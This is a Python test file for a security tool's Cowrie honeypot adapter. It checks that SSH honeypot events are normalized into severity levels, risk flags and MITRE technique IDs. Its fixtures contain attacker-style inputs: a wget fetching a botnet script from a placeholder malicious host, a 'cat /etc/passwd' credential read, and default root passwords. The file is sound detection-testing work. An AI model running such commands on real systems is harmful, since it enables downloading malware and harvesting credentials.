"""
AEGIS Tests — Cowrie Adapter tests.
"""

from __future__ import annotations

from app.services.adapters.cowrie_splunk_adapter import CowrieSplunkAdapter


def test_cowrie_login_failed():
    """Test normalization of a Cowrie failed login event."""
    adapter = CowrieSplunkAdapter()
    payload = {
        "eventid": "cowrie.login.failed",
        "timestamp": "2026-04-09T04:12:05.000Z",
        "src_ip": "185.220.101.45",
        "src_port": 48392,
        "dst_ip": "10.0.1.10",
        "dst_port": 2222,
        "username": "root",
        "password": "admin123",
        "session": "a1b2c3d4e5f6",
        "sensor": "svr04",
        "protocol": "ssh",
    }

    result = adapter.normalize(payload)

    assert result.source_family == "siem"
    assert result.source_type == "cowrie_splunk"
    assert result.category == "authentication"
    assert result.event_name == "failed_login"
    assert result.severity == "medium"
    assert result.source_ip == "185.220.101.45"
    assert result.user_name == "root"
    assert result.session_id == "a1b2c3d4e5f6"
    assert "T1110" in result.mitre_technique_ids


def test_cowrie_login_success():
    """Test normalization of a Cowrie successful login event."""
    adapter = CowrieSplunkAdapter()
    payload = {
        "eventid": "cowrie.login.success",
        "timestamp": "2026-04-09T04:15:01.000Z",
        "src_ip": "185.220.101.45",
        "username": "root",
        "password": "root",
        "session": "a1b2c3d4e5f6",
        "sensor": "svr04",
    }

    result = adapter.normalize(payload)

    assert result.event_name == "successful_login"
    assert result.severity == "high"
    assert "T1078" in result.mitre_technique_ids
    assert "honeypot_login_success" in result.risk_flags


def test_cowrie_command_high_risk_wget():
    """Test that wget commands get severity upgrade and risk flags."""
    adapter = CowrieSplunkAdapter()
    payload = {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-04-09T04:15:18.000Z",
        "src_ip": "185.220.101.45",
        "session": "a1b2c3d4e5f6",
        "input": "wget http://malicious.example.com/botnet.sh",
        "sensor": "svr04",
    }

    result = adapter.normalize(payload)

    assert result.event_name == "command_execution"
    assert result.severity == "critical"  # Upgraded from high
    assert "suspicious_download" in result.risk_flags
    assert result.raw_command == "wget http://malicious.example.com/botnet.sh"


def test_cowrie_command_credential_harvesting():
    """Test cat /etc/passwd gets credential_harvesting flag."""
    adapter = CowrieSplunkAdapter()
    payload = {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-04-09T04:15:15.000Z",
        "src_ip": "185.220.101.45",
        "session": "a1b2c3d4e5f6",
        "input": "cat /etc/passwd",
        "sensor": "svr04",
    }

    result = adapter.normalize(payload)

    assert "credential_harvesting" in result.risk_flags
    assert result.severity == "critical"


def test_cowrie_file_download():
    """Test normalization of file download event."""
    adapter = CowrieSplunkAdapter()
    payload = {
        "eventid": "cowrie.session.file_download",
        "timestamp": "2026-04-09T04:15:22.000Z",
        "src_ip": "185.220.101.45",
        "session": "a1b2c3d4e5f6",
        "url": "http://malicious.example.com/botnet.sh",
        "shasum": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "sensor": "svr04",
    }

    result = adapter.normalize(payload)

    assert result.event_name == "file_download"
    assert result.severity == "critical"
    assert "suspicious_download" in result.risk_flags
    assert "malware_candidate" in result.risk_flags
    assert "T1105" in result.mitre_technique_ids


def test_cowrie_benign_command():
    """Test that benign commands don't get severity boost."""
    adapter = CowrieSplunkAdapter()
    payload = {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-04-09T04:15:10.000Z",
        "src_ip": "185.220.101.45",
        "session": "a1b2c3d4e5f6",
        "input": "whoami",
        "sensor": "svr04",
    }

    result = adapter.normalize(payload)

    assert result.severity == "high"  # Base severity, no upgrade
    assert len(result.risk_flags) == 0


def test_cowrie_session_connect():
    """Test normalization of session connect event."""
    adapter = CowrieSplunkAdapter()
    payload = {
        "eventid": "cowrie.session.connect",
        "timestamp": "2026-04-09T04:12:00.000Z",
        "src_ip": "185.220.101.45",
        "src_port": 48392,
        "dst_ip": "10.0.1.10",
        "dst_port": 2222,
        "session": "a1b2c3d4e5f6",
        "sensor": "svr04",
    }

    result = adapter.normalize(payload)

    assert result.category == "network"
    assert result.event_name == "ssh_connection_attempt"
    assert result.severity == "low"
    assert "T1046" in result.mitre_technique_ids
